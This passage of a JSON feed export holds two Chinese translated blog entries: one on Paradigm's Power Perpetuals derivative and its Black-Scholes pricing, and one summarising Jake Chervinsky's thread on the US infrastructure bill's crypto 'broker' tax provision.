          "description": "<blockquote>\n<p>译注：作者同意刊载，不过尚未检查翻译准确与否。仓促翻译，可能会有谬误，大家多和原文比对，不正确的地方欢迎邮件我更正。</p>\n</blockquote>\n<p>原文链接：<a href=\"https://www.paradigm.xyz/2021/08/power-perpetuals/\"   target=\"_blank\" >Power Perpetuals</a></p>\n<p>发布于：8.17.2021</p>\n<p>作者：Dave White, Dan Robinson, Zubin Koticha, Andrew Leone, Alexis Gauba, Aparna Krishnan</p>\n<h2 id=\"简介\">简介</h2>\n<p>本文介绍了一种新型的衍生品 &ndash; 乘方永续合约。</p>\n<p>如果 ETH 的价格翻倍，ETH 的 2 次方永续合约翻 4 倍，ETH 的 3 次方永续合约翻 8 倍，ETH 的 5 次方永续合约翻 32 倍。</p>\n<p>当然，这种不对称的上涨并不是免费的。那些做多乘方永续合约的人需要定期支付溢价收益，给那些做空的人。</p>\n<p>乘方永续合约提供了类似于全球期权的风险敞口，而不需要行权价或到期日，使其有可能将大部分期权市场的流动性，整合到单一的工具中。</p>\n<p>从不少方面来讲，乘方永续合约都是 <a href=\"https://www.paradigm.xyz/2021/05/everlasting-options/\"   target=\"_blank\" >永续期权</a> 合理的下一步。据我们所知，除我们外，研究人员 <a href=\"https://github.com/waynenilsen/zendax/blob/master/latex/PowerClaims.pdf\"   target=\"_blank\" >Wayne Nilsen</a> 和 <a href=\"https://llllvvuu.dev/blog/raw-moments\"   target=\"_blank\" >lllvvuu</a> 也各自独立发现了这种产品。</p>\n<h2 id=\"机制\">机制</h2>\n<h3 id=\"前提条件\">前提条件</h3>\n<p>乘方永续合约是 <a href=\"https://www.paradigm.xyz/2021/05/everlasting-options/\"   target=\"_blank\" >永续期权</a> 论文中介绍的永续衍生品的一个特殊系列。</p>\n<p>在本文接下来的内容中，我们将假设读者已经熟悉永续期权和 <a href=\"https://research.paradigm.xyz/cartoon-guide-to-perps\"   target=\"_blank\" >永续期货</a> 的基本机制。</p>\n<h3 id=\"定义\">定义</h3>\n<p>乘方永续合约是指与某些标的资产价格的乘方挂钩的永续衍生品。在本文中，我们将假设这个标的资产是以太币。</p>\n<p>对于任何乘方 p，ETH^p 乘方永续合约都是通过定期（如每天）支付的资金费用来维持的。如果在注资时，乘方永续合约的当前价格是 $MARK，做多乘方永续合约的人必须向做空的人支付 $(MARK-INDEX)=$(MARK-ETH^p)。</p>\n<p>在乘方永续合约里，我们把这种资金费用称为 <em>溢价收益 (premium yield)</em>。因为这种费用通常是由多头向空头支付的溢价，以换取类似期权的风险敞口。</p>\n<h3 id=\"例子\">例子</h3>\n<p>考虑 ETH^2 乘方永续合约。</p>\n<p>为简单起见，假设 ETH 的交易价格为 $3，而在支付资金时，ETH^2 乘方永续合约的交易价格为 $9.09。那么每份合约多头都将不得不向空头支付 $(MARK-INDEX)=$(MARK-ETH^2)=$(9.09-3^2)=$9.09-$9.00=$0.09。</p>\n<h2 id=\"定价\">定价</h2>\n<h3 id=\"概述\">概述</h3>\n<p>乘方大于 1 的永续合约具有正的 <a href=\"https://twitter.com/_Dave__White_/status/1423740205874302976?s=20\"   target=\"_blank\" >凸性</a>，这意味着当价格对他们有利时，持有者赚钱更快，而当价格对他们不利时，亏钱则更慢。用期权的话说，我们说它们有正的 <a href=\"https://en.wikipedia.org/wiki/Greeks_%28finance%29#Gamma\"   target=\"_blank\" >伽马值 (gamma)</a>。</p>\n<p>就像期权通常以其 <a href=\"https://en.wikipedia.org/wiki/Intrinsic_value_%28finance%29#Options\"   target=\"_blank\" >内在价值</a> 的溢价交易一样，ETH^p 的乘方永续合约通常以 ETH 价格的 p 次幂的溢价交易。</p>\n<h3 id=\"推导\">推导</h3>\n<p>按照 <a href=\"https://www.paradigm.xyz/2021/05/everlasting-options\"   target=\"_blank\" >永续期权论文</a> 中的方法，我们可以先对即将到期的乘方衍生品进行定价，然后这些衍生品的组合进行定价，这个组合刚好相当于所需的永续合约。</p>\n<p>下面我们将使用 Black-Scholes 假设来推导我们的价格。这些当然不是最合适的假设，但应该可以作为一个例子来说明做市商如何去给乘方永续合约估值。</p>\n<p>在 Black-Scholes 假设下给一个即将到期的乘方衍生品定价要比给期权定价简单得多。有兴趣的读者可以在 StackExchange <a href=\"https://math.stackexchange.com/questions/1015926/derivatives-pricing-w-squared-and-cubed-stock-prices/3954177#3954177\"   target=\"_blank\" >这里</a> 找到一个快速推导。其价格为</p>\n<p>\\[S^pe^{t\\frac {p-1}{2}(2r+pv^2)}\\]</p>\n<p>其中 S 是现货价格，p 是乘方数，t 是到期时间，r 是漂移（drift）或者叫无风险利率，v 是年化波动率。</p>\n<p>结合 <a href=\"https://www.paradigm.xyz/papers/everlasting_options.pdf\"   target=\"_blank\" >永续期权论文</a> 附录 B 中的永续期权定价方法，并对所得的几何数列进行求和，我们可以得到每期支付一次资金的乘方永续合约的价格表达式如下（假设数列收敛 &ndash; 见下文）：</p>\n<p>\\[S^p\\frac {1}{2e^{-f\\frac {p-1}{2}(2r+pv^2)}-1}\\]</p>\n<p>其中 f 是以年为单位的注资期。</p>\n<p>这可以解释为指数 S^p 乘以调整系数 \\(\\frac {1}{2e^{-frac {p-1}{2}(2r+pv^2)}-1}\\)，该系数考虑了乘方永续合约的嵌入式期权性。需要注意的是，当注资期接近 0 时，这个调整系数接近 1。</p>\n<p>溢价收益（我们对融资率的新术语）可以计算为：</p>\n<p>\\[\\text {MARK}-\\text {INDEX} = S^P (\\frac {1}{2e^{-f\\frac {p-1}{2}(2r+pv^2)}-1}-1)\\]</p>\n<h3 id=\"收敛性\">收敛性</h3>\n<p>我们总是可以对股票永续期权进行定价，而与之不同的是，配置不好的乘方永续合约可能会出现价格无法收敛的情况。特别是，我们只有在以下情况下才可以对乘方永续合约进行定价：</p>\n<p>\\[\\frac {e^{f\\frac {p-1}{2}(2r+pv^2)}}{2} &lt; 1\\]</p>\n<p>直观地说，乘方数和波动率越高，长期的临期乘方期货就越有价值；注资期越长，乘方永续合约的价值就越集中于长期的乘方期货。对某些组合来说，同等的投资组合可以变得无限有价值。</p>\n<p>这个问题在实践中可以通过选择一个足够小的注资期来轻松避免。</p>\n<h2 id=\"例子-1\">例子</h2>\n<h3 id=\"eth2-乘方永续合约\">ETH^2 乘方永续合约</h3>\n<p><img src=\"https://zhangluyao.com/images/power-perpetual/eth_2-1536x1133.png\" alt=\"\"></p>\n<p>见 <a href=\"https://github.com/para-dave/powerperps/blob/master/power_perp_prices.ipynb\"   target=\"_blank\" >https://github.com/para-dave/powerperps/blob/master/power_perp_prices.ipynb</a>。</p>\n<p>在 Black-Scholes 假设下，ETH^2 乘方永续合约的价格为 \\(S^2\\frac {1}{2e^{-f（r+v^2）}-1}\\)。</p>\n<p>在其他条件相同的情况下，当 ETH 价格 4 倍时，它会翻 16 倍。</p>\n<p>它有一个很方便的特性，就是有一个恒定的伽马值，即 \\(\\frac {2}{2e^{-f (r+v^2)}-1}\\)，这意味着无论 ETH 的价格如何，它都能提供恒定的期权性。</p>\n<p>我们亲切地称它为 &ldquo;squeeth&rdquo;，是 &ldquo;ETH 平方&rdquo; 的简称。</p>\n<h3 id=\"eth3-乘方永续合约\">ETH^3 乘方永续合约</h3>\n<p><img src=\"https://zhangluyao.com/images/power-perpetual/eth_3-1536x1133.png\" alt=\"\"></p>\n<p>见 <a href=\"https://github.com/para-dave/powerperps/blob/master/power_perp_prices.ipynb\"   target=\"_blank\" >https://github.com/para-dave/powerperps/blob/master/power_perp_prices.ipynb</a>。</p>\n<p>ETH^3 乘方永续合约的价格为 \\(S^3\\frac {1}{2e^{-f（2r+pv^2）}-1}\\)。</p>\n<p>在其他条件相同的情况下，ETH 价格翻 4 倍时，它将翻 64 倍。</p>\n<p>你可以从图中清楚地看到永续合约的交易价格比其指数 ETH^3 要高，因为它为持有者提供了期权。</p>\n<h3 id=\"python-定价实现\">Python 定价实现</h3>\n<p>你可以在 <a href=\"https://github.com/para-dave/powerperps/\"   target=\"_blank\" >https://github.com/para-dave/powerperps/</a> 看到乘方永续合约定价的 Python 实现，包括根据经验证明正确性的测试。</p>\n<h2 id=\"总结\">总结</h2>\n<p>乘方永续合约仍处于起步阶段，但我们从 <a href=\"https://twitter.com/snarkyzk/status/1413514817877381128?s=20\"   target=\"_blank\" >一开始</a> 就对其进行了深入的研究，并仍对其潜力感到非常兴奋。</p>\n<p>如果你和我们一样对这种新东西感到好奇，我们很想听听你的想法。你可以发邮件给 <a href=\"dave@paradigm.xyz\"  >dave@paradigm.xyz</a>，或 <a href=\"https://twitter.com/messages/compose?recipient_id=1184231093576392704\"   target=\"_blank\" >在 Twitter 上给我发私信</a>，或通过 <a href=\"squeeth@opyn.co\"  >squeeth@opyn.co</a>，联系 Opyn。</p>\n<p>鸣谢：lllvvuu、Wayne Nilsen、Wade Prospere、Grug、Lily Francus、Benn Eifert 博士、Jeff Wang、Mewny</p>\n",
          "content": "<blockquote>\n<p>译注：作者同意刊载，不过尚未检查翻译准确与否。仓促翻译，可能会有谬误，大家多和原文比对，不正确的地方欢迎邮件我更正。</p>\n</blockquote>\n<p>原文链接：<a href=\"https://www.paradigm.xyz/2021/08/power-perpetuals/\"   target=\"_blank\" >Power Perpetuals</a></p>\n<p>发布于：8.17.2021</p>\n<p>作者：Dave White, Dan Robinson, Zubin Koticha, Andrew Leone, Alexis Gauba, Aparna Krishnan</p>\n<h2 id=\"简介\">简介</h2>\n<p>本文介绍了一种新型的衍生品 &ndash; 乘方永续合约。</p>\n<p>如果 ETH 的价格翻倍，ETH 的 2 次方永续合约翻 4 倍，ETH 的 3 次方永续合约翻 8 倍，ETH 的 5 次方永续合约翻 32 倍。</p>\n<p>当然，这种不对称的上涨并不是免费的。那些做多乘方永续合约的人需要定期支付溢价收益，给那些做空的人。</p>\n<p>乘方永续合约提供了类似于全球期权的风险敞口，而不需要行权价或到期日，使其有可能将大部分期权市场的流动性，整合到单一的工具中。</p>\n<p>从不少方面来讲，乘方永续合约都是 <a href=\"https://www.paradigm.xyz/2021/05/everlasting-options/\"   target=\"_blank\" >永续期权</a> 合理的下一步。据我们所知，除我们外，研究人员 <a href=\"https://github.com/waynenilsen/zendax/blob/master/latex/PowerClaims.pdf\"   target=\"_blank\" >Wayne Nilsen</a> 和 <a href=\"https://llllvvuu.dev/blog/raw-moments\"   target=\"_blank\" >lllvvuu</a> 也各自独立发现了这种产品。</p>\n<h2 id=\"机制\">机制</h2>\n<h3 id=\"前提条件\">前提条件</h3>\n<p>乘方永续合约是 <a href=\"https://www.paradigm.xyz/2021/05/everlasting-options/\"   target=\"_blank\" >永续期权</a> 论文中介绍的永续衍生品的一个特殊系列。</p>\n<p>在本文接下来的内容中，我们将假设读者已经熟悉永续期权和 <a href=\"https://research.paradigm.xyz/cartoon-guide-to-perps\"   target=\"_blank\" >永续期货</a> 的基本机制。</p>\n<h3 id=\"定义\">定义</h3>\n<p>乘方永续合约是指与某些标的资产价格的乘方挂钩的永续衍生品。在本文中，我们将假设这个标的资产是以太币。</p>\n<p>对于任何乘方 p，ETH^p 乘方永续合约都是通过定期（如每天）支付的资金费用来维持的。如果在注资时，乘方永续合约的当前价格是 $MARK，做多乘方永续合约的人必须向做空的人支付 $(MARK-INDEX)=$(MARK-ETH^p)。</p>\n<p>在乘方永续合约里，我们把这种资金费用称为 <em>溢价收益 (premium yield)</em>。因为这种费用通常是由多头向空头支付的溢价，以换取类似期权的风险敞口。</p>\n<h3 id=\"例子\">例子</h3>\n<p>考虑 ETH^2 乘方永续合约。</p>\n<p>为简单起见，假设 ETH 的交易价格为 $3，而在支付资金时，ETH^2 乘方永续合约的交易价格为 $9.09。那么每份合约多头都将不得不向空头支付 $(MARK-INDEX)=$(MARK-ETH^2)=$(9.09-3^2)=$9.09-$9.00=$0.09。</p>\n<h2 id=\"定价\">定价</h2>\n<h3 id=\"概述\">概述</h3>\n<p>乘方大于 1 的永续合约具有正的 <a href=\"https://twitter.com/_Dave__White_/status/1423740205874302976?s=20\"   target=\"_blank\" >凸性</a>，这意味着当价格对他们有利时，持有者赚钱更快，而当价格对他们不利时，亏钱则更慢。用期权的话说，我们说它们有正的 <a href=\"https://en.wikipedia.org/wiki/Greeks_%28finance%29#Gamma\"   target=\"_blank\" >伽马值 (gamma)</a>。</p>\n<p>就像期权通常以其 <a href=\"https://en.wikipedia.org/wiki/Intrinsic_value_%28finance%29#Options\"   target=\"_blank\" >内在价值</a> 的溢价交易一样，ETH^p 的乘方永续合约通常以 ETH 价格的 p 次幂的溢价交易。</p>\n<h3 id=\"推导\">推导</h3>\n<p>按照 <a href=\"https://www.paradigm.xyz/2021/05/everlasting-options\"   target=\"_blank\" >永续期权论文</a> 中的方法，我们可以先对即将到期的乘方衍生品进行定价，然后这些衍生品的组合进行定价，这个组合刚好相当于所需的永续合约。</p>\n<p>下面我们将使用 Black-Scholes 假设来推导我们的价格。这些当然不是最合适的假设，但应该可以作为一个例子来说明做市商如何去给乘方永续合约估值。</p>\n<p>在 Black-Scholes 假设下给一个即将到期的乘方衍生品定价要比给期权定价简单得多。有兴趣的读者可以在 StackExchange <a href=\"https://math.stackexchange.com/questions/1015926/derivatives-pricing-w-squared-and-cubed-stock-prices/3954177#3954177\"   target=\"_blank\" >这里</a> 找到一个快速推导。其价格为</p>\n<p>\\[S^pe^{t\\frac {p-1}{2}(2r+pv^2)}\\]</p>\n<p>其中 S 是现货价格，p 是乘方数，t 是到期时间，r 是漂移（drift）或者叫无风险利率，v 是年化波动率。</p>\n<p>结合 <a href=\"https://www.paradigm.xyz/papers/everlasting_options.pdf\"   target=\"_blank\" >永续期权论文</a> 附录 B 中的永续期权定价方法，并对所得的几何数列进行求和，我们可以得到每期支付一次资金的乘方永续合约的价格表达式如下（假设数列收敛 &ndash; 见下文）：</p>\n<p>\\[S^p\\frac {1}{2e^{-f\\frac {p-1}{2}(2r+pv^2)}-1}\\]</p>\n<p>其中 f 是以年为单位的注资期。</p>\n<p>这可以解释为指数 S^p 乘以调整系数 \\(\\frac {1}{2e^{-frac {p-1}{2}(2r+pv^2)}-1}\\)，该系数考虑了乘方永续合约的嵌入式期权性。需要注意的是，当注资期接近 0 时，这个调整系数接近 1。</p>\n<p>溢价收益（我们对融资率的新术语）可以计算为：</p>\n<p>\\[\\text {MARK}-\\text {INDEX} = S^P (\\frac {1}{2e^{-f\\frac {p-1}{2}(2r+pv^2)}-1}-1)\\]</p>\n<h3 id=\"收敛性\">收敛性</h3>\n<p>我们总是可以对股票永续期权进行定价，而与之不同的是，配置不好的乘方永续合约可能会出现价格无法收敛的情况。特别是，我们只有在以下情况下才可以对乘方永续合约进行定价：</p>\n<p>\\[\\frac {e^{f\\frac {p-1}{2}(2r+pv^2)}}{2} &lt; 1\\]</p>\n<p>直观地说，乘方数和波动率越高，长期的临期乘方期货就越有价值；注资期越长，乘方永续合约的价值就越集中于长期的乘方期货。对某些组合来说，同等的投资组合可以变得无限有价值。</p>\n<p>这个问题在实践中可以通过选择一个足够小的注资期来轻松避免。</p>\n<h2 id=\"例子-1\">例子</h2>\n<h3 id=\"eth2-乘方永续合约\">ETH^2 乘方永续合约</h3>\n<p><img src=\"https://zhangluyao.com/images/power-perpetual/eth_2-1536x1133.png\" alt=\"\"></p>\n<p>见 <a href=\"https://github.com/para-dave/powerperps/blob/master/power_perp_prices.ipynb\"   target=\"_blank\" >https://github.com/para-dave/powerperps/blob/master/power_perp_prices.ipynb</a>。</p>\n<p>在 Black-Scholes 假设下，ETH^2 乘方永续合约的价格为 \\(S^2\\frac {1}{2e^{-f（r+v^2）}-1}\\)。</p>\n<p>在其他条件相同的情况下，当 ETH 价格 4 倍时，它会翻 16 倍。</p>\n<p>它有一个很方便的特性，就是有一个恒定的伽马值，即 \\(\\frac {2}{2e^{-f (r+v^2)}-1}\\)，这意味着无论 ETH 的价格如何，它都能提供恒定的期权性。</p>\n<p>我们亲切地称它为 &ldquo;squeeth&rdquo;，是 &ldquo;ETH 平方&rdquo; 的简称。</p>\n<h3 id=\"eth3-乘方永续合约\">ETH^3 乘方永续合约</h3>\n<p><img src=\"https://zhangluyao.com/images/power-perpetual/eth_3-1536x1133.png\" alt=\"\"></p>\n<p>见 <a href=\"https://github.com/para-dave/powerperps/blob/master/power_perp_prices.ipynb\"   target=\"_blank\" >https://github.com/para-dave/powerperps/blob/master/power_perp_prices.ipynb</a>。</p>\n<p>ETH^3 乘方永续合约的价格为 \\(S^3\\frac {1}{2e^{-f（2r+pv^2）}-1}\\)。</p>\n<p>在其他条件相同的情况下，ETH 价格翻 4 倍时，它将翻 64 倍。</p>\n<p>你可以从图中清楚地看到永续合约的交易价格比其指数 ETH^3 要高，因为它为持有者提供了期权。</p>\n<h3 id=\"python-定价实现\">Python 定价实现</h3>\n<p>你可以在 <a href=\"https://github.com/para-dave/powerperps/\"   target=\"_blank\" >https://github.com/para-dave/powerperps/</a> 看到乘方永续合约定价的 Python 实现，包括根据经验证明正确性的测试。</p>\n<h2 id=\"总结\">总结</h2>\n<p>乘方永续合约仍处于起步阶段，但我们从 <a href=\"https://twitter.com/snarkyzk/status/1413514817877381128?s=20\"   target=\"_blank\" >一开始</a> 就对其进行了深入的研究，并仍对其潜力感到非常兴奋。</p>\n<p>如果你和我们一样对这种新东西感到好奇，我们很想听听你的想法。你可以发邮件给 <a href=\"dave@paradigm.xyz\"  >dave@paradigm.xyz</a>，或 <a href=\"https://twitter.com/messages/compose?recipient_id=1184231093576392704\"   target=\"_blank\" >在 Twitter 上给我发私信</a>，或通过 <a href=\"squeeth@opyn.co\"  >squeeth@opyn.co</a>，联系 Opyn。</p>\n<p>鸣谢：lllvvuu、Wayne Nilsen、Wade Prospere、Grug、Lily Francus、Benn Eifert 博士、Jeff Wang、Mewny</p>\n",
          "category": "",
          "link": "https://zhangluyao.com/blog/power-perpetual/",
          "creator": "Luyao",
          "pubDate": "Wed, 18 Aug 2021 00:39:09 +0800",
          "enclosure": "",
          "enclosureType": "",
          "image": "",
          "id": "",
          "language": "en",
          "folder": "log",
          "feed": "zhangluyao",
          "read": false,
          "favorite": false,
          "created": false,
          "tags": [],
          "hash": "ef6b20f7bc0ffa9cd750dfba6b3d18dd",
          "highlights": []
        },
        {
          "title": "[译文] 美国基建法案中加密货币部分的总结",
          "description": "<p>拜登政府最近正在通过一项一万亿美金的基础建设法案，其中有一些条款涉及到加密货币行业。Compound 的首席顾问律师 <a href=\"https://twitter.com/jchervinsky\"   target=\"_blank\" >Jake Chervinsky</a> 在推特上对此做了一些<a href=\"https://twitter.com/jchervinsky/status/1421150344051048451\"   target=\"_blank\" >总结和提醒</a>，简单翻译了一下，下面是中文：</p>\n<p>1/ 美国基础建设法案的情况是这样的。</p>\n<p>增加了一个新条款，扩大了税法<strong>对 “经纪人（broker）” 的定义，几乎涵盖了加密货币中的每一个人，包括矿工等非托管人（non-custodial），迫使他们都要对用户做KYC</strong>。</p>\n<p>这不是一个演习</p>\n<p>2/ 该法案扩大了 “经纪人” 的定义，涵盖了 “任何（为获得报酬）负责并定期提供任何实现数字资产转移服务的人。”</p>\n<p>之前的草案里写 <strong>“即使是非托管人（even non-custodial）”，并明确包括去中心化交易所（DEX）和 P2P 市场</strong>。</p>\n<p>3/ 这个定义非常广泛，如果按字面意思理解，它几乎可以适用于美国加密货币行业的所有经济参与者。</p>\n<p>这包括 <strong>PoW 矿工</strong>和 <strong>PoS 验证者</strong>，因为 “提供服务以实现数字资产的转移以获得报酬” 似乎都适用。</p>\n<p>4/ 它也可能包括大量的 DeFi 市场参与者，如 <strong>流动性提供者（DEX LPs）、清算人、协议治理人（governors）</strong> 等。</p>\n<p>根据 “为获得报酬（for consideration）” 的含义，它也可能扩展到非经济参与者，如节点运营商或钱包开发商。</p>\n<p>这个范围可能是非常大的。</p>\n<p>5/ 税法要求经纪人遵守国税局（IRS）的报告要求。最重要的是，他们必须给客户提供 1099 表，并将其提交给国税局。</p>\n<p>为了填写 1099 表，经纪人必须收集客户数据，包括姓名、地址、电话号码等。</p>\n<p>6/ 这意味着<strong>经纪人必须对客户做KYC（了解客户）</strong>，以遵守 IRS 的报告要求。</p>\n<p>因此，该条款的功能是监视任务，就像 Mnuchin 部长在特朗普政府的最后几天提议的那样。</p>\n<p>和以前一样，这是一个非常糟糕的想法。</p>\n<p>7/ 了解加密货币的人已经知道，用户是匿名的，接入是无许可的。</p>\n<p>像矿工这样的非托管者简直不可能获得他们需要的信息来弄 1099 表。</p>\n<p>在实践中，<strong>这有可能意味着在美国事实上禁止采矿</strong>。</p>\n<p>8/ 这听起来很疯狂，但它真的有可能发生。</p>\n<p><strong>大多数加密货币立法都不了了之，所以很容易被忽视。这一次不会</strong>。</p>\n<p>这项规定是两党和其他受欢迎的基础设施法案的一部分，该法案正在国会中迅速推进，并极有可能通过。</p>\n<p>9/ 你可能会问，加密货币与基础设施有什么关系？</p>\n<p>该法案必须包括 “支付（pay-for）” 条款，为新的支出筹集收入，以便在整体上实现收支平衡。“经纪人”的定义是参议院起草的该法案里的支付条款之一。</p>\n<p>10/ 在这样的法案中，有三种主要方式来提高收入：增加现有的税收，增加新的税收，或改善税收的遵守情况。</p>\n<p>据称，这属于第三类，使人们支付他们已经欠下的税款。<strong>国会认为加密货币充满了逃税者</strong>。（并非如此。）</p>\n<p>11/ 基础设施法案估计将花费超过 1 万亿美元。国会评估新的“经纪人”定义可以带来 280 亿美元的新增税收。</p>\n<p>我不知道他们是如何得到这个数字的，也不知道这怎么可能计算出来。</p>\n<p>不管怎么说，不应该用这种方式去弄一个新法规。</p>\n<p>12 这是一个被严重误导的条款，如果被采纳，对美国利益的伤害将远远大于好处。</p>\n<p>我给你讲讲我的五大理由。</p>\n<p>首先，通过一项实际上不可能遵守的规定是违背逻辑的，除非目的是要扼杀这个行业。</p>\n<p>13/ 第二，这将是一个巨大的外交政策失败。</p>\n<p>在中国犯了迫使矿工离开他们国家的地缘政治错误之后，我们中的许多人都希望美国能在这个关键领域占据市场份额。</p>\n<p>我们不能重蹈中国的覆辙。我们必须留在游戏中。</p>\n<p>14/ 第三，这行不通。每增加一美元的税收，我们就会损失两美元（或十美元），因为美国的加密货币行业会关闭或转移到海外。</p>\n<p>随着越来越多的用户在不受监管的平台上“暗度陈仓”，国税局非但不会弄清楚应缴税的加密货币收益，反而只会知道得更少。</p>\n<p>15/ 第四，它打破了我们与 FinCEN（译注：美国金融犯罪执法网） 的讨论。</p>\n<p>自从拜登总统上任以来，FinCEN 已经在加密货币反洗钱监管方面做了大量扎实的工作。我们应该保持这一进程，而不是通过税法的后门偷偷加入 KYC 来切断它。</p>\n<p>16/ 第五，它将对公民权利造成的负担是不可接受的。</p>\n<p>我们的 4A 隐私权限制了政府在没有搜查令的情况下可以进行多少监控，而在后SolarWinds（译注：美国软件公司，曾遭受攻击导致重大数据泄漏）时代，我们最不需要做的就是将更多敏感信息暴露在安全漏洞中。</p>\n<p>17/ 那么，我们能做什么？</p>\n<p>首先，不要惊慌。这项规定还不是最终的，仍然可能被修改。</p>\n<p>即使它按原样通过，最早也要到 2023 年才能生效，所以至少我们有时间在国会或法庭上尝试撤销它。这可能是一场漫长的斗争。</p>\n<p>18/ 如果你是美国公民，给你的国会议员打电话，特别是参议员Portman，如果你在俄亥俄州的话。</p>\n<p>在我们抵挡了 FinCEN 和 FATF 之后，如果还有人说 &ldquo;这么做是没用的&rdquo;，我就要疯了。</p>\n<p>查找您的众议院代表：<a href=\"https://www.house.gov/representatives/find-your-representative\"   target=\"_blank\" >https://www.house.gov/representatives/find-your-representative</a></p>\n<p>查找你的参议员：<a href=\"https://www.senate.gov/senators/senators-contact.htm\"   target=\"_blank\" >https://www.senate.gov/senators/senators-contact.htm</a></p>\n<p>19/ 如果你是一家美国加密货币公司的领导人，并且还没有参与其中，请联系我或 <a href=\"https://twitter.com/BlockchainAssn\"   target=\"_blank\" >@BlockchainAssn</a> 的团队（在给你的国会议员打电话后）。你的发声是特别重要的。</p>\n<p>最后，请大家给 <a href=\"https://twitter.com/coincenter\"   target=\"_blank\" >@coincenter</a> 捐款。他们可能需要它。</p>\n<p>20/ 就我而言，像往常一样，我将与 <a href=\"https://twitter.com/BlockchainAssn\"   target=\"_blank\" >@BlockchainAssn</a>、<a href=\"https://twitter.com/fund_defi\"   target=\"_blank\" >@fund_defi</a> 和其他人合作，提起诉讼，挑战该条款，如果事情发展到这一步。</p>\n<p>我不认为法院会乐于看到一条强迫非托管者（替国税局）监视美国公民的法律。</p>\n<p>21/ 事情进展很快，这可能会让人感到害怕。</p>\n<p>但是，正如此前 FinCEN 的提案一样，我们惊讶地看到，看到整个行业在本周齐心协力地反对这一点。我们确实有一些最好最聪明的人站在我们这边。</p>\n<p>请继续关注更新。</p>\n<p>[END]</p>\n",
          "content": "<p>拜登政府最近正在通过一项一万亿美金的基础建设法案，其中有一些条款涉及到加密货币行业。Compound 的首席顾问律师 <a href=\"https://twitter.com/jchervinsky\"   target=\"_blank\" >Jake Chervinsky</a> 在推特上对此做了一些<a href=\"https://twitter.com/jchervinsky/status/1421150344051048451\"   target=\"_blank\" >总结和提醒</a>，简单翻译了一下，下面是中文：</p>\n<p>1/ 美国基础建设法案的情况是这样的。</p>\n<p>增加了一个新条款，扩大了税法<strong>对 “经纪人（broker）” 的定义，几乎涵盖了加密货币中的每一个人，包括矿工等非托管人（non-custodial），迫使他们都要对用户做KYC</strong>。</p>\n<p>这不是一个演习</p>\n<p>2/ 该法案扩大了 “经纪人” 的定义，涵盖了 “任何（为获得报酬）负责并定期提供任何实现数字资产转移服务的人。”</p>\n<p>之前的草案里写 <strong>“即使是非托管人（even non-custodial）”，并明确包括去中心化交易所（DEX）和 P2P 市场</strong>。</p>\n<p>3/ 这个定义非常广泛，如果按字面意思理解，它几乎可以适用于美国加密货币行业的所有经济参与者。</p>\n<p>这包括 <strong>PoW 矿工</strong>和 <strong>PoS 验证者</strong>，因为 “提供服务以实现数字资产的转移以获得报酬” 似乎都适用。</p>\n<p>4/ 它也可能包括大量的 DeFi 市场参与者，如 <strong>流动性提供者（DEX LPs）、清算人、协议治理人（governors）</strong> 等。</p>\n<p>根据 “为获得报酬（for consideration）” 的含义，它也可能扩展到非经济参与者，如节点运营商或钱包开发商。</p>\n<p>这个范围可能是非常大的。</p>\n<p>5/ 税法要求经纪人遵守国税局（IRS）的报告要求。最重要的是，他们必须给客户提供 1099 表，并将其提交给国税局。</p>\n<p>为了填写 1099 表，经纪人必须收集客户数据，包括姓名、地址、电话号码等。</p>\n<p>6/ 这意味着<strong>经纪人必须对客户做KYC（了解客户）</strong>，以遵守 IRS 的报告要求。</p>\n<p>因此，该条款的功能是监视任务，就像 Mnuchin 部长在特朗普政府的最后几天提议的那样。</p>\n<p>和以前一样，这是一个非常糟糕的想法。</p>\n<p>7/ 了解加密货币的人已经知道，用户是匿名的，接入是无许可的。</p>\n<p>像矿工这样的非托管者简直不可能获得他们需要的信息来弄 1099 表。</p>\n<p>在实践中，<strong>这有可能意味着在美国事实上禁止采矿</strong>。</p>\n<p>8/ 这听起来很疯狂，但它真的有可能发生。</p>\n<p><strong>大多数加密货币立法都不了了之，所以很容易被忽视。这一次不会</strong>。</p>\n<p>这项规定是两党和其他受欢迎的基础设施法案的一部分，该法案正在国会中迅速推进，并极有可能通过。</p>\n<p>9/ 你可能会问，加密货币与基础设施有什么关系？</p>\n<p>该法案必须包括 “支付（pay-for）” 条款，为新的支出筹集收入，以便在整体上实现收支平衡。“经纪人”的定义是参议院起草的该法案里的支付条款之一。</p>\n<p>10/ 在这样的法案中，有三种主要方式来提高收入：增加现有的税收，增加新的税收，或改善税收的遵守情况。</p>\n<p>据称，这属于第三类，使人们支付他们已经欠下的税款。<strong>国会认为加密货币充满了逃税者</strong>。（并非如此。）</p>\n<p>11/ 基础设施法案估计将花费超过 1 万亿美元。国会评估新的“经纪人”定义可以带来 280 亿美元的新增税收。</p>\n<p>我不知道他们是如何得到这个数字的，也不知道这怎么可能计算出来。</p>\n<p>不管怎么说，不应该用这种方式去弄一个新法规。</p>\n<p>12 这是一个被严重误导的条款，如果被采纳，对美国利益的伤害将远远大于好处。</p>\n<p>我给你讲讲我的五大理由。</p>\n<p>首先，通过一项实际上不可能遵守的规定是违背逻辑的，除非目的是要扼杀这个行业。</p>\n<p>13/ 第二，这将是一个巨大的外交政策失败。</p>\n<p>在中国犯了迫使矿工离开他们国家的地缘政治错误之后，我们中的许多人都希望美国能在这个关键领域占据市场份额。</p>\n<p>我们不能重蹈中国的覆辙。我们必须留在游戏中。</p>\n<p>14/ 第三，这行不通。每增加一美元的税收，我们就会损失两美元（或十美元），因为美国的加密货币行业会关闭或转移到海外。</p>\n<p>随着越来越多的用户在不受监管的平台上“暗度陈仓”，国税局非但不会弄清楚应缴税的加密货币收益，反而只会知道得更少。</p>\n<p>15/ 第四，它打破了我们与 FinCEN（译注：美国金融犯罪执法网） 的讨论。</p>\n<p>自从拜登总统上任以来，FinCEN 已经在加密货币反洗钱监管方面做了大量扎实的工作。我们应该保持这一进程，而不是通过税法的后门偷偷加入 KYC 来切断它。</p>\n<p>16/ 第五，它将对公民权利造成的负担是不可接受的。</p>\n<p>我们的 4A 隐私权限制了政府在没有搜查令的情况下可以进行多少监控，而在后SolarWinds（译注：美国软件公司，曾遭受攻击导致重大数据泄漏）时代，我们最不需要做的就是将更多敏感信息暴露在安全漏洞中。</p>\n<p>17/ 那么，我们能做什么？</p>\n<p>首先，不要惊慌。这项规定还不是最终的，仍然可能被修改。</p>\n<p>即使它按原样通过，最早也要到 2023 年才能生效，所以至少我们有时间在国会或法庭上尝试撤销它。这可能是一场漫长的斗争。</p>\n<p>18/ 如果你是美国公民，给你的国会议员打电话，特别是参议员Portman，如果你在俄亥俄州的话。</p>\n<p>在我们抵挡了 FinCEN 和 FATF 